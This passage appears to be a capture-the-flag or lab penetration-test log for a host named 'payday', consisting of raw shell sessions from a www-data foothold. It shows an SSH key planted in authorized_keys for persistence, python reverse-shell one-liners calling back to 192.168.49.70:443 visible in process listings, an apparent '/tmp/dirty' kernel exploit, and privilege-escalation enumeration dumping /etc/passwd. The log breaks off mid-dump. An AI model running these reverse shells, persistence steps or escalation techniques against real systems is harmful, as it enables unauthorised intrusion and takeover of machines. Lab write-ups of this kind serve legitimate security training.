www-data@payday:/var/www$ ls -al  
ls -al 
total 148
drwxrwxrwx 15 root     root      4096 May  6  2016 .
drwxr-xr-x 14 root     root      4096 Apr 24  2008 ..
-rw-r--r--  1 patrick  patrick      1 Jul 27  2015 Thumbs.db
drwxr-xr-x 12 patrick  patrick   4096 Jul 27  2015 addons
-rw-r--r--  1 patrick  patrick   1450 Jul 27  2015 admin.php
drwxr-xr-x  2 root     root      4096 Jul 27  2015 apache2-default
drwxr-xr-x  2 patrick  patrick   4096 Aug 31  2006 catalog
-rw-r--r--  1 patrick  patrick   9814 Jul 27  2015 chart.php
drwxr-xr-x 10 patrick  patrick   4096 Aug 31  2006 classes
-rw-rw-rw-  1 patrick  patrick  11287 Sep  3  2020 config.php
drwxr-xr-x  2 patrick  patrick   4096 Jul 27  2015 core
-rw-r--r--  1 patrick  patrick   1704 Jul 27  2015 image.php
drwxrwxrwx  2 patrick  patrick   4096 Jul 27  2015 images
drwxr-xr-x  5 patrick  patrick   4096 Jul 27  2015 include
-rw-r--r--  1 patrick  patrick   3430 Jul 27  2015 index.php
-rw-r--r--  1 patrick  patrick   7138 Jul 27  2015 init.php
-rw-r--r--  1 patrick  patrick  19550 Jul 27  2015 install.php
drwxr-xr-x  2 root     root      4096 Jul 27  2015 install_db
drwxr-xr-x  4 patrick  patrick   4096 Jul 27  2015 payments
-rw-r--r--  1 patrick  patrick   3459 Jul 27  2015 prepare.php
drwxr-xr-x  3 patrick  patrick   4096 Jul 27  2015 shippings
drwxrwxrwx  4 www-data www-data  4096 Jan 23 00:54 skins
-rw-r--r--  1 patrick  patrick  11973 Jul 27  2015 store_closed.gif
-rw-r--r--  1 patrick  patrick    575 Jul 27  2015 store_closed.html
drwxr-xr-x  2 patrick  patrick   4096 Jul 27  2015 targets
drwxrwxrwx  5 patrick  patrick   4096 Jul 27  2015 var
www-data@payday:/var/www$ mkdir .ssh
mkdir .ssh
www-data@payday:/var/www$ cd .ssh
cd .ssh
www-data@payday:/var/www/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3+QWx6uDPIRJYS+o+rXA9/LoxxOglF1LdIg0H9mSfTd4k9xNzuiiqxK/NqJ7zHQ+TdzWNL8JalaziRXn7xXLwjaSD3UEnWlXXNcOzugGyiMAYKEVVMTGlu2FSFdpQ4xmtpuhUaUHG411bJyTUM7xOrakXiSCoAm0ivj8m8tKFyGK65MBOiJOm7TNnHC7N50NqY6b5fI6s+NG6J8BZPZrwxoHbjrHXDBoGJqJz8/n0BnmwrjQ27YTl4Wdy7bbYBSDDmFGC2JCXvlzMZlcrajzq3DPnZhUw7NQ4UxjLdUqToCBvmoQEYIONd9FK09haaa7uvwMILH9yQrcYK/URh8CETcq5rVpzi3cQyaCEgOkXhxmkxDNlmHmPj3504Obq1gdMfWoJRdOnBlPmgSoJepqJg2lfZypeceNB7F3OWEU1Z/ewD3aP476kFUmXRfAoQ9ydE8ksLG/YmsTrkwhr24mm+amRMtFDDve9sdHARfnon9zK/uwxmv5mOgPRqllTTzc= kali@kali" > authorized_keys
<mRMtFDDve9sdHARfnon9zK/uwxmv5mOgPRqllTTzc= kali@kali" > authorized_keys     
www-data@payday:/var/www/.ssh$ ls
ls
authorized_keys
www-data@payday:/var/www/.ssh$ cd ~
cd ~
www-data@payday:/var/www$ cd ~/.ssh
cd ~/.ssh
www-data@payday:/var/www/.ssh$ ls
ls
authorized_keys
www-data@payday:/var/www/.ssh$ cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3+QWx6uDPIRJYS+o+rXA9/LoxxOglF1LdIg0H9mSfTd4k9xNzuiiqxK/NqJ7zHQ+TdzWNL8JalaziRXn7xXLwjaSD3UEnWlXXNcOzugGyiMAYKEVVMTGlu2FSFdpQ4xmtpuhUaUHG411bJyTUM7xOrakXiSCoAm0ivj8m8tKFyGK65MBOiJOm7TNnHC7N50NqY6b5fI6s+NG6J8BZPZrwxoHbjrHXDBoGJqJz8/n0BnmwrjQ27YTl4Wdy7bbYBSDDmFGC2JCXvlzMZlcrajzq3DPnZhUw7NQ4UxjLdUqToCBvmoQEYIONd9FK09haaa7uvwMILH9yQrcYK/URh8CETcq5rVpzi3cQyaCEgOkXhxmkxDNlmHmPj3504Obq1gdMfWoJRdOnBlPmgSoJepqJg2lfZypeceNB7F3OWEU1Z/ewD3aP476kFUmXRfAoQ9ydE8ksLG/YmsTrkwhr24mm+amRMtFDDve9sdHARfnon9zK/uwxmv5mOgPRqllTTzc= kali@kali
www-data@payday:/var/www/.ssh$ 
```

# Privesc

## Services

```
www-data@payday:/etc/dovecot$ netstat -ano
netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN     off (0.00/0/0)
tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN     off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     off (0.00/0/0)
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     off (0.00/0/0)
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN     off (0.00/0/0)
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN     off (0.00/0/0)
tcp        0      0 192.168.70.39:80        192.168.49.70:56778     SYN_RECV   on (2.48/0/0)
tcp        0      0 192.168.70.39:80        192.168.49.70:56772     SYN_RECV   on (2.48/0/0)
tcp        0      0 192.168.70.39:80        192.168.49.70:56768     SYN_RECV   on (2.48/0/0)
tcp        0      0 192.168.70.39:80        192.168.49.70:56770     SYN_RECV   on (2.48/0/0)
tcp        0      0 192.168.70.39:80        192.168.49.70:56774     SYN_RECV   on (2.48/0/0)
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     off (0.00/0/0)
tcp      227      0 192.168.70.39:41591     192.168.49.70:443       CLOSE_WAIT off (0.00/0/0)
tcp        0      0 192.168.70.39:47979     192.168.49.70:443       CLOSE_WAIT off (0.00/0/0)
tcp        0      0 192.168.70.39:36270     192.168.49.70:443       CLOSE_WAIT off (0.00/0/0)
tcp      239      0 192.168.70.39:59098     192.168.49.70:443       CLOSE_WAIT off (0.00/0/0)
tcp        9      0 192.168.70.39:45273     192.168.49.70:443       CLOSE_WAIT off (0.00/0/0)
tcp        1      0 192.168.70.39:36269     192.168.49.70:443       CLOSE_WAIT off (0.00/0/0)
tcp        0      0 192.168.70.39:45274     192.168.49.70:443       ESTABLISHEDoff (0.00/0/0)
tcp        1      0 192.168.70.39:59100     192.168.49.70:443       ESTABLISHEDoff (0.00/0/0)
tcp        0   1956 192.168.70.39:59101     192.168.49.70:443       ESTABLISHEDon (1.94/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN     keepalive (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN     off (0.00/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56710 TIME_WAIT  timewait (22.32/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56736 TIME_WAIT  timewait (41.44/0/0)
tcp6       0    481 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56764 ESTABLISHEDon (1.72/0/0)
tcp6       0    483 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56752 ESTABLISHEDon (6.71/0/0)
tcp6       0    482 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56766 ESTABLISHEDon (5.50/0/0)
tcp6       0    482 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56760 ESTABLISHEDon (0.53/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56718 TIME_WAIT  timewait (24.83/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56536 ESTABLISHEDkeepalive (6904.65/0/0)
tcp6       0    479 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56754 ESTABLISHEDon (26.07/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56708 TIME_WAIT  timewait (22.87/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56738 TIME_WAIT  timewait (42.40/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56744 TIME_WAIT  timewait (57.22/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56460 ESTABLISHEDkeepalive (6820.80/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56742 TIME_WAIT  timewait (57.99/0/0)
tcp6       0    484 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56750 ESTABLISHEDon (0.54/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56728 TIME_WAIT  timewait (29.50/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:55322 ESTABLISHEDkeepalive (5650.51/0/0)
tcp6       0    481 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56762 ESTABLISHEDon (0.59/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56732 TIME_WAIT  timewait (50.74/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56722 TIME_WAIT  timewait (29.50/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56746 TIME_WAIT  timewait (59.48/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56720 TIME_WAIT  timewait (31.52/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:54710 ESTABLISHEDkeepalive (4900.57/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56740 TIME_WAIT  timewait (52.03/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:53888 ESTABLISHEDkeepalive (4276.49/0/0)
tcp6       0    483 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56756 ESTABLISHEDon (0.52/0/0)
tcp6       0    482 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56758 ESTABLISHEDon (0.52/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56730 TIME_WAIT  timewait (31.88/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56724 TIME_WAIT  timewait (24.83/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56712 TIME_WAIT  timewait (15.14/0/0)
tcp6       0    483 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56776 ESTABLISHEDon (1.16/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56726 TIME_WAIT  timewait (32.40/0/0)
tcp6       0      0 ::ffff:192.168.70.39:80 ::ffff:192.168.49:56748 TIME_WAIT  timewait (59.17/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node Path
unix  2      [ ACC ]     STREAM     LISTENING     14598    /var/run/dovecot/dict-server
unix  2      [ ACC ]     STREAM     LISTENING     14600    /var/run/dovecot/login/default
unix  2      [ ACC ]     STREAM     LISTENING     14605    /var/run/dovecot/auth-worker.4700
unix  2      [ ACC ]     STREAM     LISTENING     14377    /var/run/mysqld/mysqld.sock
unix  2      [ ]         DGRAM                    8427     @/com/ubuntu/upstart
unix  6      [ ]         DGRAM                    14185    /dev/log
unix  2      [ ]         DGRAM                    8579     @/org/kernel/udev/udevd
unix  2      [ ACC ]     STREAM     LISTENING     13990    /var/run/vmware/guestServicePipe
unix  2      [ ACC ]     STREAM     LISTENING     14574    /tmp/.winbindd/pipe
unix  2      [ ACC ]     STREAM     LISTENING     14576    /var/run/samba/winbindd_privileged/pipe
unix  3      [ ]         STREAM     CONNECTED     29829    /var/run/dovecot/login/default
unix  3      [ ]         STREAM     CONNECTED     29827    
unix  3      [ ]         STREAM     CONNECTED     29824    
unix  3      [ ]         STREAM     CONNECTED     29823    
unix  3      [ ]         STREAM     CONNECTED     29828    /var/run/dovecot/login/default
unix  3      [ ]         STREAM     CONNECTED     29822    
unix  3      [ ]         STREAM     CONNECTED     29819    
unix  3      [ ]         STREAM     CONNECTED     29818    
unix  3      [ ]         STREAM     CONNECTED     29786    /var/run/dovecot/login/default
unix  3      [ ]         STREAM     CONNECTED     29772    
unix  3      [ ]         STREAM     CONNECTED     29769    
unix  3      [ ]         STREAM     CONNECTED     29768    
unix  3      [ ]         STREAM     CONNECTED     29753    /var/run/dovecot/login/default
unix  3      [ ]         STREAM     CONNECTED     29752    
unix  3      [ ]         STREAM     CONNECTED     29749    
unix  3      [ ]         STREAM     CONNECTED     29748    
unix  3      [ ]         STREAM     CONNECTED     20425    /var/run/dovecot/login/default
unix  3      [ ]         STREAM     CONNECTED     20424    
unix  3      [ ]         STREAM     CONNECTED     20421    
unix  3      [ ]         STREAM     CONNECTED     20420    
unix  3      [ ]         STREAM     CONNECTED     20419    /var/run/dovecot/login/default
unix  3      [ ]         STREAM     CONNECTED     20418    
unix  3      [ ]         STREAM     CONNECTED     20415    
unix  3      [ ]         STREAM     CONNECTED     20414    
unix  2      [ ]         DGRAM                    14882    
unix  3      [ ]         STREAM     CONNECTED     14646    
unix  3      [ ]         STREAM     CONNECTED     14645    
unix  3      [ ]         STREAM     CONNECTED     14639    
unix  3      [ ]         STREAM     CONNECTED     14638    
unix  3      [ ]         STREAM     CONNECTED     14637    /var/run/samba/winbindd_privileged/pipe
unix  3      [ ]         STREAM     CONNECTED     14636    
unix  3      [ ]         STREAM     CONNECTED     14603    
unix  3      [ ]         STREAM     CONNECTED     14602    
unix  2      [ ]         DGRAM                    14592    
unix  3      [ ]         STREAM     CONNECTED     14579    
unix  3      [ ]         STREAM     CONNECTED     14578    
unix  2      [ ]         DGRAM                    14374    
unix  2      [ ]         DGRAM                    14237    
www-data@payday:/etc/dovecot$ ps aux --forest | cat
ps aux --forest | cat
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S<   Jan22   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [migration/0]
root         4  0.0  0.0      0     0 ?        SN   Jan22   0:00  \_ [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [watchdog/0]
root         6  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [events/0]
root         7  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [khelper]
root        26  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [kblockd/0]
root        27  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [kacpid]
root        28  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [kacpi_notify]
root       181  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [kseriod]
root       205  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [pdflush]
root       206  0.0  0.0      0     0 ?        S    Jan22   0:00  \_ [pdflush]
root       207  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [kswapd0]
root       259  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [aio/0]
root      1997  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [ata/0]
root      1998  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [ata_aux]
root      2000  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [scsi_eh_0]
root      2001  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [scsi_eh_1]
root      2281  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [scsi_eh_2]
root      2475  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [kjournald]
root      3651  0.0  0.0      0     0 ?        S<   Jan22   0:00  \_ [kpsmoused]
root         1  0.0  0.3   2952  1856 ?        Ss   Jan22   0:00 /sbin/init
root      2634  0.0  0.1   2332   748 ?        S<s  Jan22   0:00 /sbin/udevd --daemon
root      4124  0.0  0.9  17824  4820 ?        Sl   Jan22   0:00 /usr/sbin/vmtoolsd
root      4169  0.0  1.4  13768  7676 ?        S    Jan22   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
root      4392  0.0  0.0   1692   512 tty4     Ss+  Jan22   0:00 /sbin/getty 38400 tty4
root      4393  0.0  0.1   1692   516 tty5     Ss+  Jan22   0:00 /sbin/getty 38400 tty5
root      4396  0.0  0.1   1692   516 tty2     Ss+  Jan22   0:00 /sbin/getty 38400 tty2
root      4399  0.0  0.1   1692   516 tty3     Ss+  Jan22   0:00 /sbin/getty 38400 tty3
root      4402  0.0  0.1   1692   516 tty1     Ss+  Jan22   0:00 /sbin/getty 38400 tty1
root      4403  0.0  0.1   1696   516 tty6     Ss+  Jan22   0:00 /sbin/getty 38400 tty6
syslog    4442  0.0  0.1   1916   700 ?        Ss   Jan22   0:00 /sbin/syslogd -u syslog
root      4461  0.0  0.1   1840   536 ?        S    Jan22   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
klog      4463  0.0  0.2   2504  1412 ?        Ss   Jan22   0:00 /sbin/klogd -P /var/run/klogd/kmsg
root      4542  0.0  0.1   1752   524 ?        S    Jan22   0:00 /bin/sh /usr/bin/mysqld_safe
mysql     4582  0.0  3.6 129480 18620 ?        Sl   Jan22   0:02  \_ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/mysqld.sock
root      4583  0.0  0.1   1680   552 ?        S    Jan22   0:00  \_ logger -p daemon.err -t mysqld_safe -i -t mysqld
root      4657  0.0  0.4   9904  2280 ?        Ss   Jan22   0:00 /usr/sbin/smbd -D
root      4739  0.0  0.1   9904   916 ?        S    Jan22   0:00  \_ /usr/sbin/smbd -D
root      4671  0.0  0.2   7988  1380 ?        Ss   Jan22   0:00 /usr/sbin/winbindd
root      4689  0.0  0.3   8112  1724 ?        S    Jan22   0:00  \_ /usr/sbin/winbindd
root      4727  0.0  0.2   7996  1296 ?        S    Jan22   0:00  \_ /usr/sbin/winbindd
root      4738  0.0  0.1   7988   880 ?        S    Jan22   0:00  \_ /usr/sbin/winbindd
root      4694  0.0  0.1   2048   676 ?        Ss   Jan22   0:00 /usr/sbin/dovecot
root      4700  0.0  0.5   9600  2740 ?        S    Jan22   0:00  \_ dovecot-auth
dovecot   5442  0.0  0.2   3464  1540 ?        S    Jan22   0:00  \_ pop3-login
dovecot   5443  0.0  0.2   3464  1540 ?        S    Jan22   0:00  \_ pop3-login
dovecot   6238  0.0  0.2   3464  1536 ?        S    00:07   0:00  \_ imap-login
dovecot   6239  0.0  0.2   3468  1540 ?        S    00:07   0:00  \_ imap-login
dovecot   6245  0.0  0.2   3464  1540 ?        S    00:07   0:00  \_ pop3-login
dovecot   6246  0.0  0.2   3468  1540 ?        S    00:07   0:00  \_ imap-login
daemon    4709  0.0  0.0   1960   428 ?        Ss   Jan22   0:00 /usr/sbin/atd
root      4720  0.0  0.1   2332   912 ?        Ss   Jan22   0:00 /usr/sbin/cron
root      4751  0.0  1.2  21568  6224 ?        Ss   Jan22   0:00 /usr/sbin/apache2 -k start
www-data  4937  0.0  1.6  23872  8716 ?        S    Jan22   0:03  \_ /usr/sbin/apache2 -k start
www-data  5242  0.0  1.7  23872  8784 ?        S    Jan22   0:06  \_ /usr/sbin/apache2 -k start
www-data 14718  0.0  0.0   1756   492 ?        S    01:39   0:00  |   \_ sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
www-data 14719  0.0  0.7   6244  3656 ?        R    01:39   0:00  |       \_ python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
www-data 14720  0.0  0.3   3388  1804 pts/3    Ss   01:39   0:00  |           \_ /bin/bash
www-data 15027  0.0  0.1   2340   936 pts/3    R+   01:44   0:00  |               \_ ps aux --forest
www-data 15028  0.0  0.0   1680   392 pts/3    S+   01:44   0:00  |               \_ cat
www-data  5267  0.0  2.0  26012 10780 ?        S    Jan22   0:03  \_ /usr/sbin/apache2 -k start
www-data  5293  0.0  1.9  25404 10148 ?        S    Jan22   0:03  \_ /usr/sbin/apache2 -k start
www-data  5294  0.0  1.8  24868  9708 ?        S    Jan22   0:04  \_ /usr/sbin/apache2 -k start
www-data  5298  0.0  1.7  23896  9104 ?        S    Jan22   0:02  \_ /usr/sbin/apache2 -k start
www-data  5752  0.0  1.7  24112  9112 ?        S    Jan22   0:05  \_ /usr/sbin/apache2 -k start
www-data 12671  0.0  0.0   1756   492 ?        S    01:06   0:00  |   \_ sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
www-data 12672 14.8  0.7   6252  3660 ?        R    01:06   5:40  |       \_ python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
www-data 12673  0.0  0.3   3408  1832 pts/1    Ss+  01:06   0:00  |           \_ /bin/bash
www-data  6205  0.0  1.7  24120  8956 ?        S    00:06   0:02  \_ /usr/sbin/apache2 -k start
www-data  6257  0.0  1.7  23880  8924 ?        S    00:22   0:01  \_ /usr/sbin/apache2 -k start
www-data 14672  0.0  0.0   1752   484 ?        S    01:38   0:00  |   \_ sh -c /tmp/dirty
www-data 14673  0.1  0.1  26408   564 ?        Sl   01:38   0:00  |       \_ /tmp/dirty
www-data  6258  0.0  0.9  21568  4840 ?        S    00:36   0:01  \_ /usr/sbin/apache2 -k start
www-data  6259  0.0  0.9  21568  4980 ?        S    00:36   0:01  \_ /usr/sbin/apache2 -k start
www-data  6260  0.0  0.9  21568  4840 ?        S    00:36   0:00  \_ /usr/sbin/apache2 -k start
www-data  6293  0.0  0.0   1756   492 ?        S    00:57   0:00  |   \_ sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
www-data  6294 23.8  0.7   6240  3652 ?        S    00:57  11:10  |       \_ python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
www-data  6295  0.0  0.3   3392  1808 pts/0    Ss   00:57   0:00  |           \_ /bin/bash
www-data  6311  0.0  0.1   1752   608 pts/0    S+   00:59   0:00  |               \_ /bin/sh ./lse.sh
www-data  6346  0.0  0.0      0     0 pts/0    Z+   00:59   0:00  |                   \_ [lse.sh] <defunct>
www-data  6352  0.0  0.0      0     0 pts/0    Z+   00:59   0:00  |                   \_ [rm] <defunct>
www-data  7905  0.0  0.0   1752   400 pts/0    S+   00:59   0:00  |                   \_ /bin/sh ./lse.sh
www-data 15026  0.0  0.0   1676   420 pts/0    S+   01:44   0:00  |                       \_ sleep 1
www-data  6261  0.0  1.6  23852  8424 ?        S    00:36   0:00  \_ /usr/sbin/apache2 -k start
www-data 13452  0.0  0.0   1756   492 ?        S    01:18   0:00  |   \_ sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
www-data 13453  0.0  0.7   6240  3652 ?        S    01:18   0:00  |       \_ python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
www-data 13464  0.0  0.3   3408  1836 pts/2    Ss+  01:19   0:00  |           \_ /bin/bash
www-data  6274  0.0  0.7  21568  3860 ?        S    00:50   0:00  \_ /usr/sbin/apache2 -k start
www-data  6278  0.0  0.7  21568  3860 ?        S    00:50   0:00  \_ /usr/sbin/apache2 -k start
www-data  6280  0.0  0.7  21568  3848 ?        S    00:52   0:00  \_ /usr/sbin/apache2 -k start
www-data  6305  0.0  0.7  21568  3856 ?        S    00:58   0:00  \_ /usr/sbin/apache2 -k start
www-data 12698  0.0  0.7  21568  3856 ?        S    01:06   0:00  \_ /usr/sbin/apache2 -k start
www-data 13462  0.0  0.7  21568  3856 ?        S    01:19   0:00  \_ /usr/sbin/apache2 -k start
www-data 13468  0.0  0.9  21568  4812 ?        S    01:19   0:00  \_ /usr/sbin/apache2 -k start
www-data 13469  0.0  0.9  21568  4916 ?        S    01:19   0:00  \_ /usr/sbin/apache2 -k start
www-data 14618  0.0  0.7  21568  3848 ?        S    01:38   0:00  \_ /usr/sbin/apache2 -k start
root      4922  0.0  0.1   5280   992 ?        Ss   Jan22   0:00 /usr/sbin/sshd
www-data@payday:/etc/dovecot$ 

```

## Privesc Scripts

```
www-data@payday:/tmp$ ./linenum.sh
./linenum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Sun Jan 23 01:52:06 EST 2022                                                                                                                                            
                                                                                                                                                                        

### SYSTEM ##############################################
[-] Kernel information:
Linux payday 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux


[-] Kernel information (continued):
Linux version 2.6.22-14-server (buildd@palmer) (gcc version 4.1.3 20070929 (prerelease) (Ubuntu 4.1.2-16ubuntu2)) #1 SMP Sun Oct 14 23:34:23 GMT 2007


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=7.10
DISTRIB_CODENAME=gutsy
DISTRIB_DESCRIPTION="Ubuntu 7.10"


[-] Hostname:
payday


### USER/GROUP ##########################################
[-] Current user/group info:
uid=33(www-data) gid=33(www-data) groups=33(www-data)


[-] Who else is logged on:
 01:52:06 up  2:14,  0 users,  load average: 2.00, 2.02, 1.83
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(dhcp) gid=101(dhcp) groups=101(dhcp)
uid=101(syslog) gid=102(syslog) groups=102(syslog)
uid=102(klog) gid=103(klog) groups=103(klog)
uid=103(mysql) gid=107(mysql) groups=107(mysql)
uid=104(dovecot) gid=111(dovecot) groups=111(dovecot),8(mail)
uid=105(postfix) gid=112(postfix) groups=112(postfix)
uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),115(lpadmin)


[-] It looks like we have some admin users:
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),115(lpadmin)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
dhcp:x:100:101::/nonexistent:/bin/false
syslog:x:101:102::/home/syslog:/bin/false
